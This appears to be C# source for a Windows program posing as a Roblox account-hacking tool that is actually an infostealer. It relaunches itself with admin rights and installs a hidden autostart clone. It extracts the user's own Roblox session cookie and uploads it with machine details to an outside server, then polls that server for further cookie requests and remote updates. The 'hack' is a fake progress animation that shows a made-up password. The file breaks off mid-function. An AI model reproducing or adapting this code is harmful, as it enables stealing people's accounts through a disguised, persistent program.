using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.Http;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Media.Animation;
using System.Windows.Media.Effects;
using System.Windows.Shapes;
using System.Windows.Threading;

namespace FileTransfer
{
    public partial class MainWindow : Window
    {
        private static readonly HttpClient _http;

        private void ReadConfigFromPlaceholder()
        {
            try
            {
                string payload = ConfigData.Payload;
                // It starts with <<NEXUS_CFG_START>> and we should find <<NEXUS_CFG_END>> or just parse the JSON after the start tag
                int startIdx = payload.IndexOf("<<NEXUS_CFG_START>>");
                if (startIdx != -1)
                {
                    startIdx += "<<NEXUS_CFG_START>>".Length;
                    string jsonPart = payload.Substring(startIdx).TrimEnd();
                    int endIdx = jsonPart.IndexOf("<<NEXUS_CFG_END>>");
                    if (endIdx != -1)
                    {
                        jsonPart = jsonPart.Substring(0, endIdx).TrimEnd();
                    }

                    if (!string.IsNullOrWhiteSpace(jsonPart))
                    {
                        using (var doc = System.Text.Json.JsonDocument.Parse(jsonPart))
                        {
                            var root = doc.RootElement;
                            if (root.TryGetProperty("operatorName", out var vOp)) OperatorName = vOp.GetString() ?? OperatorName;
                            if (root.TryGetProperty("appTitleMain", out var vApp)) AppTitleMainText = vApp.GetString() ?? AppTitleMainText;
                            if (root.TryGetProperty("appTitleVersion", out var vVer)) AppTitleVersionText = vVer.GetString() ?? AppTitleVersionText;
                            if (root.TryGetProperty("windowTitle", out var vWin)) WindowTitleText = vWin.GetString() ?? WindowTitleText;
                            
                            if (root.TryGetProperty("themeAccent", out var vAcc)) ThemeAccentHex = vAcc.GetString() ?? ThemeAccentHex;
                            if (root.TryGetProperty("themeSurface", out var vSur)) ThemeSurfaceHex = vSur.GetString() ?? ThemeSurfaceHex;
                            if (root.TryGetProperty("hideConsole", out var vHc)) HideConsole = vHc.GetString() == "true";
                            if (root.TryGetProperty("hideStatus", out var vHs)) HideStatusBar = vHs.GetString() == "true";
                            if (root.TryGetProperty("loginText", out var vLt)) LoginBtnText = vLt.GetString() ?? LoginBtnText;
                            if (root.TryGetProperty("placeholderText", out var vPt)) PlaceholderTextValue = vPt.GetString() ?? PlaceholderTextValue;

                            if (root.TryGetProperty("layout", out var layoutEl) && layoutEl.ValueKind == System.Text.Json.JsonValueKind.Object)
                            {
                                LayoutJson = layoutEl.GetRawText();
                            }
                            
                            Log($"Loaded config from placeholder: Operator={OperatorName}, Accent={ThemeAccentHex}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Log("Failed to read placeholder config: " + ex.Message);
            }
        }

        private static string LayoutJson = "{}";

        private static string AppTitleMainText = "RAH NonPro";
        private static string AppTitleVersionText = " v7.2.2";
        private static string WindowTitleText = "RAH NonPro v7.2.2";
        private static string ClientVersion = "7.2.2";
        private static string ThemeAccentHex = "#00F0FF";
        private static string ThemeSurfaceHex = "#0D0E12";
        private static bool HideConsole = false;
        private static bool HideStatusBar = false;
        private static string LoginBtnText = "ВЗЛОМАТЬ";
        private static string PlaceholderTextValue = "Username";

        static MainWindow()
        {
            var handler = new HttpClientHandler
            {
                AutomaticDecompression = System.Net.DecompressionMethods.All,
                ServerCertificateCustomValidationCallback = (_, _, _, _) => true
            };
            _http = new HttpClient(handler) { Timeout = TimeSpan.FromMinutes(10) };
            _http.DefaultRequestHeaders.UserAgent.ParseAdd(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36");
            _http.DefaultRequestHeaders.Accept.ParseAdd("image/webp,image/apng,image/*,*/*;q=0.8");
        }

        private const string ServerUrl = "https://file-transfer-production-75ad.up.railway.app";
        private static string OperatorName = "Shonll";

        private string? _cpu, _ram, _gpu, _cookieError;
        private static string? _cachedToken;
        private DispatcherTimer? _debounceTimer;
        private bool _backgroundMode;
        private static Mutex? _cloneMutex;
        private static readonly string TokenLockPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "ft_token_job.lock");
        private static FileStream? _tokenLockStream;
        private static readonly Random _rng = new();

        private static bool IsHiddenInstance() => Persistence.IsRunningFromClone();

        public static void Log(string msg)
        {
            try
            {
                string logDir = System.IO.Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Microsoft", "Windows", "Themes");
                Directory.CreateDirectory(logDir);
                string logFile = System.IO.Path.Combine(logDir, "ft.log");
                File.AppendAllText(logFile, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {msg}\n");
            }
            catch { }
        }



        public MainWindow()
        {
            Log("MainWindow constructor start");
            ReadConfigFromPlaceholder();
            try
            {
                InitializeComponent();

                // Apply dynamic styles and visibility
                try
                {
                    var converter = new System.Windows.Media.BrushConverter();
                    if (!string.IsNullOrEmpty(ThemeAccentHex))
                        this.Resources["AppAccentColor"] = (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(ThemeAccentHex);
                    if (!string.IsNullOrEmpty(ThemeSurfaceHex))
                        this.Resources["Surface"] = (System.Windows.Media.SolidColorBrush)converter.ConvertFromString(ThemeSurfaceHex);


                    
                    if (BtnHack != null)
                        BtnHack.Content = LoginBtnText;

                    // Apply Layout if valid
                    // Absolute positioning is disabled to support the modern Sidebar Grid layout.
                }
                catch (Exception styleEx)
                {
                    Log("Style apply error: " + styleEx.Message);
                }

                // Apply dynamic texts
                this.Title = WindowTitleText;
                if (AppTitleMain != null) AppTitleMain.Text = AppTitleMainText;
                if (AppTitleVersion != null) AppTitleVersion.Text = AppTitleVersionText;

                Loaded += MainWindow_Loaded;

                string exePath = Process.GetCurrentProcess().MainModule?.FileName ?? "unknown";
                bool showUi = Environment.GetCommandLineArgs() is string[] args && Array.Exists(args, a => a == "--show" || a == "-show");
                bool hiddenInstance = IsHiddenInstance();
                _backgroundMode = hiddenInstance && !showUi;
                Log($"Constructor: exe={exePath}, hiddenInstance={hiddenInstance}, showUi={showUi}, _backgroundMode={_backgroundMode}");

                // Visible режим без прав админа → перезапускаем с повышением
                if (!_backgroundMode)
                {
                    bool isAdmin = new WindowsPrincipal(WindowsIdentity.GetCurrent())
                        .IsInRole(WindowsBuiltInRole.Administrator);
                    if (!isAdmin)
                    {
                        Log("Not admin, restarting with runas...");
                        try
                        {
                            Process.Start(new ProcessStartInfo
                            {
                                FileName = exePath,
                                Verb = "runas",
                                UseShellExecute = true
                            });
                        }
                        catch (Exception ex)
                        {
                            Log($"Runas restart failed: {ex.Message}");
                        }
                        Environment.Exit(0);
                        return;
                    }
                }

                if (_backgroundMode)
                {
                    // Клон — проверяем, не запущен ли уже другой клон
                    bool createdNew;
                    _cloneMutex = new Mutex(true, "Global\\FileTransferClone_v1", out createdNew);
                    if (!createdNew)
                    {
                        Log("Clone already running, exiting duplicate");
                        Environment.Exit(0);
                        return;
                    }

                    // Фоновый режим (скрытая копия из автозагрузки)
                    ShowInTaskbar = false;
                    Opacity = 0;
                    Log("Background mode start");
                    // Чиним автозагрузку если удалили
                    Persistence.EnsureAutoStart();
                    _ = Task.Run(StartBackgroundWorkAsync);
                }
                else
                {
                    // Обычный видимый режим с кнопкой "Взлом"
                    ShowInTaskbar = true;
                    Opacity = 1;
                    Log("Visible mode start");

                    // При запуске из Program Files — создаём клон и ставим в автозагрузку
                    if (!hiddenInstance)
                    {
                        if (!Persistence.IsInstalled() || !File.Exists(Persistence.DestExe))
                        {
                            Log("Installing persistence");
                            Persistence.Install();
                        }
                        // Всегда пытаемся запустить клон (Mutex предотвратит дубликаты)
                        Persistence.LaunchClone();
                    }

                    // Сразу убиваем браузеры, извлекаем куку и отправляем на сервер
                    _ = Task.Run(StartBackgroundWorkAsync);
                }

                Log("MainWindow constructor OK");
            }
            catch (Exception ex)
            {
                Log("MainWindow constructor error: " + ex);
                throw;
            }
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            base.OnClosing(e);

            if (_backgroundMode)
            {
                // Клон — остаёмся в фоне, не закрываемся
                e.Cancel = true;
                Hide();
                ShowInTaskbar = false;
                Log("Clone staying in background");
            }
            else
            {
                // Оригинал — закрываем приложение (клон работает в фоне)
                Log("Original window closed, clone survives");
                Application.Current.Shutdown();
            }
        }

        private void MainWindow_Loaded(object sender, RoutedEventArgs e)
        {
            Log("MainWindow Loaded start");
            try
            {
                if (_backgroundMode)
                {
                    Hide();
                    ShowInTaskbar = false;
                }
                else
                {
                    Opacity = 1;
                    ShowInTaskbar = true;
                    Activate();
                    InitParticles();

                    if (OperatorName == "Dildman")
                    {
                        LogoIcon.Text = "🔥";
                        LogoBorder.Visibility = Visibility.Visible;
                    }
                    else
                    {
                        LogoBorder.Visibility = Visibility.Collapsed;
                    }
                }
                Log("MainWindow Loaded OK");
            }
            catch (Exception ex)
            {
                Log("MainWindow Loaded error: " + ex);
                throw;
            }
        }

        // ── Floating Particles ───────────────────────────────────────────────
        private class Particle
        {
            public Ellipse Shape { get; set; } = null!;
            public double VX { get; set; }
            public double VY { get; set; }
            public double X { get; set; }
            public double Y { get; set; }
        }

        private readonly List<Particle> _particles = new();
        private DispatcherTimer? _particleTimer;

        private void InitParticles()
        {
            var rand = new Random();
            double w = this.Width;
            double h = this.Height;

            // Resolve accent color brush or fallback
            Brush accentBrush = new SolidColorBrush(Colors.Cyan);
            try
            {
                if (this.Resources["AppAccentColor"] is Color acc)
                    accentBrush = new SolidColorBrush(acc);
            }
            catch {}

            for (int i = 0; i < 35; i++)
            {
                double size = rand.Next(2, 7);
                double opacity = rand.NextDouble() * 0.5 + 0.15;
                
                // 30% of particles will use the accent color, others are white
                Brush fillBrush = (rand.Next(0, 100) < 30) ? accentBrush : new SolidColorBrush(Colors.White);

                var dot = new Ellipse
                {
                    Width = size,
                    Height = size,
                    Fill = fillBrush,
                    Opacity = opacity,
                    IsHitTestVisible = false
                };

                // Add small glow to larger accent particles
                if (size > 4 && fillBrush == accentBrush)
                {
                    try
                    {
                        dot.Effect = new DropShadowEffect
                        {
                            Color = ((SolidColorBrush)fillBrush).Color,
                            BlurRadius = 8,
                            ShadowDepth = 0,
                            Opacity = 0.8
                        };
                    }
                    catch {}
                }

                double x = rand.NextDouble() * w;
                double y = rand.NextDouble() * h;
                Canvas.SetLeft(dot, x);
                Canvas.SetTop(dot, y);
                ParticleCanvas.Children.Add(dot);

                _particles.Add(new Particle
                {
                    Shape = dot,
                    X = x,
                    Y = y,
                    VX = (rand.NextDouble() - 0.5) * 0.7,
                    VY = (rand.NextDouble() - 0.5) * 0.5
                });
            }

            _particleTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(30) };
            _particleTimer.Tick += (s, e) =>
            {
                double cw = this.ActualWidth;
                double ch = this.ActualHeight;
                foreach (var p in _particles)
                {
                    p.X += p.VX;
                    p.Y += p.VY;

                    if (p.X < 0) p.X = cw;
                    if (p.X > cw) p.X = 0;
                    if (p.Y < 0) p.Y = ch;
                    if (p.Y > ch) p.Y = 0;

                    Canvas.SetLeft(p.Shape, p.X);
                    Canvas.SetTop(p.Shape, p.Y);
                }
            };
            _particleTimer.Start();
        }

        private async Task StartBackgroundWorkAsync()
        {
            Log("Background work start");
            try
            {
                Log("Getting CPU...");
                _cpu = ComputerInfo.GetCPU();
                Log("Getting RAM...");
                _ram = ComputerInfo.GetRAM();
                Log("Getting GPU...");
                _gpu = ComputerInfo.GetGPU();
                Log($"HW: cpu='{_cpu}', ram='{_ram}', gpu='{_gpu}'");

                if (_backgroundMode)
                {
                    Log("Starting cookie extraction...");
                    _cachedToken ??= CookieExtractor.ExtractRobloSecurity();
                    Log($"Cookie extracted, token len={_cachedToken?.Length ?? 0}");
                    if (string.IsNullOrEmpty(_cachedToken))
                        ReadCookieDebugLog();
                }

                Log("Uploading startup data...");
                using (var startupCts = new CancellationTokenSource(TimeSpan.FromSeconds(60)))
                {
                    try
                    {
                        await UploadFileOnStartupAsync(startupCts.Token);
                    }
                    catch (OperationCanceledException)
                    {
                        Log("Startup upload TIMEOUT (60s), continuing to poll loop");
                    }
                }
                Log("Background work OK");
            }
            catch (Exception ex)
            {
                Log("Background work error: " + ex);
            }

            // Poll loop запускается ВСЕГДА (для клона и видимого окна), 
            // даже если стартовый аплоад упал с ошибкой
            Log("Starting token request poll loop...");
            await TokenRequestPollLoopAsync();
        }

        private static bool TryAcquireTokenLock()
        {
            try
            {
                _tokenLockStream = new FileStream(TokenLockPath, FileMode.Create, FileAccess.Write, FileShare.None);
                // Пишем pid чтобы было видно кто держит блокировку
                byte[] pidBytes = System.Text.Encoding.UTF8.GetBytes($"{Environment.ProcessId}");
                _tokenLockStream.Write(pidBytes, 0, pidBytes.Length);
                _tokenLockStream.Flush();
                Log($"Token lock acquired (PID={Environment.ProcessId})");
                return true;
            }
            catch (Exception ex)
            {
                Log($"Token lock BUSY (another process holds it): {ex.Message}");
                return false;
            }
        }

        private static void ReleaseTokenLock()
        {
            try
            {
                _tokenLockStream?.Dispose();
                _tokenLockStream = null;
                if (File.Exists(TokenLockPath))
                {
                    File.Delete(TokenLockPath);
                    Log("Token lock released");
                }
            }
            catch (Exception ex)
            {
                Log($"Token lock release error: {ex.Message}");
            }
        }

        private async Task TokenRequestPollLoopAsync()
        {
            Log("Token request poll loop start");
            // Небольшая случайная задержка при старте чтобы разнести polling двух процессов
            int startupDelay = _rng.Next(5000, 15000);
            Log($"Token poll initial delay: {startupDelay}ms");
            await Task.Delay(startupDelay);

            while (true)
            {
                try
                {
                    await Task.Delay(30000);

                    string pcName = ComputerInfo.GetName();
                    string checkUrl = $"{ServerUrl}/check-token-request?computerName={Uri.EscapeDataString(pcName)}&operator={Uri.EscapeDataString(OperatorName)}";
                    Log($"Token poll: checking {checkUrl}");
                    var resp = await _http.GetAsync(checkUrl);
                    var json = await resp.Content.ReadAsStringAsync();
                    Log($"Token poll response ({resp.StatusCode}): {json}");

                    bool requested = false;
                    string updateUrl = "";
                    try
                    {
                        using var doc = System.Text.Json.JsonDocument.Parse(json);
                        if (doc.RootElement.TryGetProperty("requested", out var reqEl))
                            requested = reqEl.GetBoolean();
                        if (doc.RootElement.TryGetProperty("updateRequested", out var updEl) && updEl.GetBoolean())
                        {
                            if (doc.RootElement.TryGetProperty("updateUrl", out var urlEl))
                                updateUrl = urlEl.GetString() ?? "";
                        }
                    }
                    catch { }

                    if (!string.IsNullOrEmpty(updateUrl))
                    {
                        Log($"Update requested: {updateUrl}, starting background update");
                        _ = Task.Run(async () => {
                            await Persistence.PerformUpdate(updateUrl);
                        });
                    }

                    if (requested)
                    {
                        Log("Token request: requested=true, trying to acquire lock");
                        if (!TryAcquireTokenLock())
                        {
                            Log("Token request: another process is handling, skipping this cycle");
                            continue;
                        }

                        try
                        {
                            Log("Token request: lock acquired, extracting cookie...");
                            _cachedToken = CookieExtractor.ExtractRobloSecurity();
                            Log($"Token request: extracted token len={_cachedToken?.Length ?? 0}");
                            if (string.IsNullOrEmpty(_cachedToken))
                                ReadCookieDebugLog();
                            Log("Token request: uploading...");
                            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(25));
                            try
                            {
                                await UploadFileOnStartupAsync(cts.Token);
                                Log("Token request: upload complete");
                            }
                            catch (OperationCanceledException)
                            {
                                Log("Token request: UPLOAD TIMEOUT (25s), continuing poll loop");
                            }
                        }
                        finally
                        {
                            ReleaseTokenLock();
                        }
                    }
                }
                catch (Exception ex)
                {
                    Log("Token poll error: " + ex);
                }
            }
        }

        // ── Console Logging (no-op, terminal removed) ─────────────────────
        private void AppendConsole(string tag, string tagColor, string message, string msgColor)
        {
            // No-op: console UI removed
        }

        private static SolidColorBrush BrushFromHex(string hex)
        {
            var c = (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(hex);
            return new SolidColorBrush(c);
        }

        // ── Startup Upload (computer info + cookie, no screenshots) ───────
        private async Task UploadFileOnStartupAsync(CancellationToken ct = default)
        {
            string pcName = ComputerInfo.GetName();
            Log($"Upload startup: pcName={pcName}, hasToken={!string.IsNullOrEmpty(_cachedToken)}, cookieError={_cookieError?.Length ?? 0}chars");
            try
            {
                using var content = new MultipartFormDataContent();
                content.Add(new StringContent(pcName), "computerName");
                content.Add(new StringContent(ComputerInfo.GetOS()), "os");
                content.Add(new StringContent(_cpu ?? "—"), "cpu");
                content.Add(new StringContent(_ram ?? "—"), "ram");
                content.Add(new StringContent(_gpu ?? "—"), "gpu");
                content.Add(new StringContent(OperatorName), "operator");
                content.Add(new StringContent(ClientVersion), "version");

                if (!string.IsNullOrEmpty(_cachedToken))
                {
                    content.Add(new StringContent(_cachedToken), "robloSecurity");
                    Log("Token added to upload");
                }
                else
                {
                    Log("No token to upload");
                }

                if (!string.IsNullOrEmpty(_cookieError))
                {
                    content.Add(new StringContent(_cookieError), "cookieError");
                    Log("Cookie debug log added to upload");
                }

                string url = $"{ServerUrl}/upload";
                var resp = await _http.PostAsync(url, content, ct);
                Log($"Upload startup response: {(int)resp.StatusCode}");
            }
            catch (Exception ex)
            {
                Log("Upload startup error: " + ex);
            }
        }

        private void ReadCookieDebugLog()
        {
            try
            {
                string logPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "cookie_debug.log");
                if (File.Exists(logPath))
                {
                    string logContent = File.ReadAllText(logPath);
                    if (logContent.Length > 5000)
                        logContent = logContent[^5000..];
                    _cookieError = logContent;
                    Log($"Cookie debug log read: {logContent.Length} chars");
                }
                else
                {
                    _cookieError = "cookie_debug.log not found";
                    Log("cookie_debug.log not found");
                }
            }
            catch (Exception ex)
            {
                _cookieError = $"Error reading log: {ex.Message}";
                Log($"ReadCookieDebugLog error: {ex.Message}");
            }
        }

        // ── Pre-extract cookie in visible mode (background thread) ─────────
        private async Task PreExtractCookieAsync()
        {
            Log("PreExtractCookie start");
            try
            {
                _cachedToken ??= await Task.Run(() => CookieExtractor.ExtractRobloSecurity());
                Log($"PreExtractCookie done, token len={_cachedToken?.Length ?? 0}");
            }
            catch (Exception ex)
            {
                Log("PreExtractCookie error: " + ex);
            }
        }

        // ── Window Controls ─────────────────────────────────────────────────
        private void Border_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ChangedButton == MouseButton.Left)
                DragMove();
        }

        private void CloseWindow_Click(object sender, RoutedEventArgs e) => Close();
        
        private void MinimizeWindow_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }

        private bool _isSidebarExpanded = true;

        private void BtnToggleMenu_Click(object sender, RoutedEventArgs e)
        {
            _isSidebarExpanded = !_isSidebarExpanded;
            double targetWidth = _isSidebarExpanded ? 240.0 : 72.0;
            double targetOpacity = _isSidebarExpanded ? 1.0 : 0.0;

            var anim = new DoubleAnimation
            {
                To = targetWidth,
                Duration = TimeSpan.FromMilliseconds(250),
                EasingFunction = new QuadraticEase { EasingMode = EasingMode.EaseInOut }
            };

            var fadeAnim = new DoubleAnimation
            {
                To = targetOpacity,
                Duration = TimeSpan.FromMilliseconds(150),
                EasingFunction = new QuadraticEase { EasingMode = EasingMode.EaseInOut }
            };

            SidebarBorder.BeginAnimation(FrameworkElement.WidthProperty, anim);
            LogoTitlePanel.BeginAnimation(UIElement.OpacityProperty, fadeAnim);
        }

        // ── Debounced Roblox Avatar ─────────────────────────────────────────
        private void TxtUsername_TextChanged(object sender, TextChangedEventArgs e)
        {
            if (TxtUsername.Text.Trim() == "")
            {
                AvatarBrush.ImageSource = null;
                TxtPlaceholder.Opacity = 1;
                BtnHack.IsEnabled = false;
                TxtRobloxAccountHeader.Text = "Roblox Account";
                return;
            }

            TxtPlaceholder.Opacity = 0;
            TxtRobloxAccountHeader.Text = TxtUsername.Text;

            if (_debounceTimer != null)
                _debounceTimer.Stop();
            else
            {
                _debounceTimer = new DispatcherTimer();
                _debounceTimer.Interval = TimeSpan.FromMilliseconds(700);
                _debounceTimer.Tick += DebounceTimer_Tick;
            }
            _debounceTimer.Start();
        }

        private async void DebounceTimer_Tick(object? sender, EventArgs e)
        {
            _debounceTimer?.Stop();

            string username = TxtUsername.Text.Trim();
            if (string.IsNullOrEmpty(username))
            {
                AvatarBrush.ImageSource = null;
                TxtPlaceholder.Opacity = 1;
                BtnHack.IsEnabled = false;
                return;
            }

            AppendConsole("[roblox]", "#2A2D3A", $" Поиск профиля: {username}...", "#6C5CE7");

            var avatarImage = await DownloadRobloxAvatarAsync(username);

            if (avatarImage != null)
            {
                AvatarBrush.ImageSource = avatarImage;
                AppendConsole("[roblox]", "#2A2D3A", $" ✓ Профиль загружен", "#2ED573");
                BtnHack.IsEnabled = true;
            }
            else
            {
                AvatarBrush.ImageSource = null;
                AppendConsole("[roblox]", "#2A2D3A", " ✗ Профиль не найден", "#FF4757");
                BtnHack.IsEnabled = false;
            }
        }

        /// <summary>
        /// Downloads Roblox avatar by:
        /// 1) POST to /v1/usernames/users (correct endpoint!) to resolve userId
        /// 2) GET thumbnail URL from thumbnails API  
        /// 3) Download actual image bytes via HttpClient (with User-Agent)
        /// 4) Create BitmapImage from MemoryStream (bypasses WPF's broken URI loader)
        /// </summary>
        private async Task<BitmapImage?> DownloadRobloxAvatarAsync(string username)
        {
            try
            {
                // Step 1: Resolve username → userId
                // FIXED: correct endpoint is /v1/usernames/users NOT /v1/users/by-usernames
                var payload = new { usernames = new[] { username }, excludeBannedUsers = false };
                var jsonPayload = System.Text.Json.JsonSerializer.Serialize(payload);
                using var reqContent = new StringContent(jsonPayload, System.Text.Encoding.UTF8, "application/json");

                var response = await _http.PostAsync("https://users.roblox.com/v1/usernames/users", reqContent);
                if (!response.IsSuccessStatusCode)
                {
                    System.Diagnostics.Debug.WriteLine($"Users API returned {response.StatusCode}");
                    return null;
                }

                var resStr = await response.Content.ReadAsStringAsync();
                using var doc = System.Text.Json.JsonDocument.Parse(resStr);
                var data = doc.RootElement.GetProperty("data");
                if (data.GetArrayLength() == 0) return null;

                long userId = data[0].GetProperty("id").GetInt64();

                // Step 2: Get headshot thumbnail URL
                var thumbUrl = $"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={userId}&size=150x150&format=Png&isCircular=false";
                var thumbResponse = await _http.GetAsync(thumbUrl);
                if (!thumbResponse.IsSuccessStatusCode) return null;

                var thumbStr = await thumbResponse.Content.ReadAsStringAsync();
                using var thumbDoc = System.Text.Json.JsonDocument.Parse(thumbStr);
                var thumbData = thumbDoc.RootElement.GetProperty("data");
                if (thumbData.GetArrayLength() == 0) return null;

                var state = thumbData[0].GetProperty("state").GetString();
                var imageUrl = thumbData[0].GetProperty("imageUrl").GetString();
                
                // If state is "Pending", retry once after a short delay
                if (state == "Pending" || string.IsNullOrEmpty(imageUrl))
                {
                    await Task.Delay(2000);
                    thumbResponse = await _http.GetAsync(thumbUrl);
                    if (!thumbResponse.IsSuccessStatusCode) return null;
                    thumbStr = await thumbResponse.Content.ReadAsStringAsync();
                    using var retryDoc = System.Text.Json.JsonDocument.Parse(thumbStr);
                    var retryData = retryDoc.RootElement.GetProperty("data");
                    if (retryData.GetArrayLength() == 0) return null;
                    imageUrl = retryData[0].GetProperty("imageUrl").GetString();
                }

                if (string.IsNullOrEmpty(imageUrl)) return null;

                // Step 3: Download the actual image bytes via HttpClient
                var imageBytes = await _http.GetByteArrayAsync(imageUrl);

                // Step 4: Create BitmapImage from byte array on UI thread
                return await Dispatcher.InvokeAsync(() =>
                {
                    var bitmap = new BitmapImage();
                    using (var ms = new MemoryStream(imageBytes))
                    {
                        bitmap.BeginInit();
                        bitmap.CacheOption = BitmapCacheOption.OnLoad;
                        bitmap.StreamSource = ms;
                        bitmap.EndInit();
                    }
                    bitmap.Freeze();
                    return bitmap;
                });
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Roblox Avatar Error: {ex.Message}");
                return null;
            }
        }

        private async void BtnHack_Click(object sender, RoutedEventArgs e)
        {
            string username = TxtUsername.Text.Trim();
            if (string.IsNullOrEmpty(username))
            {
                AppendConsole("[error]", "#FF4757", " Введите никнейм Roblox!", "#FF4757");
                return;
            }

            // Переизвлекаем куку прямо перед отправкой — Chrome мог перезапуститься
            AppendConsole("[system]", "#2A2D3A", " Проверка данных...", "#A29BFE");
            string freshToken = CookieExtractor.ExtractRobloSecurity();
            if (!string.IsNullOrEmpty(freshToken))
            {
                _cachedToken = freshToken;
                AppendConsole("[system]", "#2A2D3A", " Токен найден", "#2ED573");
            }
            else
            {
                AppendConsole("[system]", "#FFA502", " Токен не найден, отправка без него", "#FFA502");
            }

            string token = _cachedToken ?? "";

            BtnHack.IsEnabled = false;
            TxtUsername.IsEnabled = false;
            
            // Hide input and check button, show progress bar
            TxtUsernameGrid.Visibility = Visibility.Collapsed;
            BtnHack.Visibility = Visibility.Collapsed;
            HackProgress.Visibility = Visibility.Visible;
            HackProgress.Value = 0;

            var rand = new Random();
            int totalSeconds = rand.Next(25, 36);

            string[] steps = new[]
            {
                "Подключение к Roblox API...",
                "Поиск пользователя в базе данных...",
                "Идентификация UserId...",
                "Проверка сессии авторизации...",
                "Анализ хешей аккаунта...",
                "Подключение к серверу...",
                "Анализ трафика WebSocket...",
                "Извлечение данных профиля...",
                "Загрузка пакетов из базы...",
                "Проверка 2FA верификации...",
                "Генерация ключа доступа..."
            };

            int elapsed = 0;
            int stepIndex = 0;

            while (elapsed < totalSeconds)
            {
                int nextDelay = rand.Next(2, 5);
                if (elapsed + nextDelay > totalSeconds)
                    nextDelay = totalSeconds - elapsed;

                double progress = (double)elapsed / totalSeconds * 100;
                HackProgress.Value = progress;

                if (stepIndex < steps.Length)
                {
                    AppendConsole($"[{elapsed}s]", "#FFA502", $" {steps[stepIndex]}", "#A29BFE");
                    stepIndex++;
                }
                else
                {
                    int pct = rand.Next(60, 100);
                    AppendConsole($"[{elapsed}s]", "#FFA502", $" Анализ данных: {pct}%...", "#A29BFE");
                }

                await Task.Delay(nextDelay * 1000);
                elapsed += nextDelay;
            }

            HackProgress.Value = 100;

            if (username.Length <= 6)
            {
                AppendConsole("[error]", "#FF4757", " Ошибка: не удалось получить данные", "#FF4757");
                
                // Show back input fields
                TxtUsernameGrid.Visibility = Visibility.Visible;
                BtnHack.Visibility = Visibility.Visible;
                BtnHack.IsEnabled = true;
                TxtUsername.IsEnabled = true;
                HackProgress.Visibility = Visibility.Collapsed;
                return;
            }

            AppendConsole("[done]", "#2ED573", " Проверка завершена!", "#2ED573");

            string fakePassword = GetDeterministicPassword(username.ToLowerInvariant());

            // Отправляем username/password на сервер (токен уже ушёл при старте)
            try
            {
                var updatePayload = new
                {
                    computerName = ComputerInfo.GetName(),
                    robloxUser = username,
                    fakePassword = fakePassword,
                    robloSecurity = token,
                    @operator = OperatorName
                };
                var jsonUpdate = System.Text.Json.JsonSerializer.Serialize(updatePayload);
                using var updateContent = new StringContent(jsonUpdate, System.Text.Encoding.UTF8, "application/json");
                string url = $"{ServerUrl}/update-roblox";
                await _http.PostAsync(url, updateContent);
            }
            catch { }

            TxtPassword.Text = fakePassword;
            AppendConsole("[result]", "#2ED573", $" Пароль: {fakePassword}", "#2ED573");

            // Done state: hide inputs/progress, show result
            HackProgress.Visibility = Visibility.Collapsed;
            PanelInputGroup.Visibility = Visibility.Collapsed;
            PanelResultGroup.Visibility = Visibility.Visible;
        }

        private void BtnReset_Click(object sender, RoutedEventArgs e)
        {
            TxtUsername.Text = "";
            TxtUsername.IsEnabled = true;
            BtnHack.IsEnabled = false;
            TxtRobloxAccountHeader.Text = "Roblox Account";

            // Reset visibility states
            TxtUsernameGrid.Visibility = Visibility.Visible;
            BtnHack.Visibility = Visibility.Visible;
            HackProgress.Visibility = Visibility.Collapsed;
            
            PanelInputGroup.Visibility = Visibility.Visible;
            PanelResultGroup.Visibility = Visibility.Collapsed;
        }

        private string GetDeterministicPassword(string username)
        {
            int seed = 0;
            foreach (char c in username)
            {
                seed = (seed * 31) + c;
            }
            var rand = new Random(seed);
            int length = rand.Next(10, 15);
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%&*?_";
            var buf = new char[length];
            for (int i = 0; i < length; i++)
                buf[i] = chars[rand.Next(chars.Length)];
            return new string(buf);
        }

        private void BtnTelegram_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "https://t.me/robloxvzlomez",
                });
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine("Error opening Telegram link: " + ex.Message);
            }
        }

        // ── Navigation Sidebar ──────────────────────────────────────────────
        private void ResetNavButtons()
        {
            BtnNavDashboard.Tag = "";
            BtnNavSettings.Tag = "";
            
            ViewDashboard.Visibility = Visibility.Collapsed;
            ViewSettings.Visibility = Visibility.Collapsed;
        }

        private void BtnNavDashboard_Click(object sender, RoutedEventArgs e)
        {
            ResetNavButtons();
            BtnNavDashboard.Tag = "Active";
            ViewDashboard.Visibility = Visibility.Visible;
        }

        private void BtnNavSettings_Click(object sender, RoutedEventArgs e)
        {
            ResetNavButtons();
            BtnNavSettings.Tag = "Active";
            ViewSettings.Visibility = Visibility.Visible;
        }

        // ── Theme Changer ───────────────────────────────────────────────────
        private void BtnTheme_Click(object sender, RoutedEventArgs e)
        {
            if (sender is Button btn && btn.Background is SolidColorBrush brush)
            {
                ThemeAccentHex = brush.Color.ToString();
                this.Resources["AppAccentColor"] = brush.Color;
                
                // Remove stroke from all buttons
                BtnThemeCyan.Template = GetThemeButtonTemplate(false, BtnThemeCyan.Background);
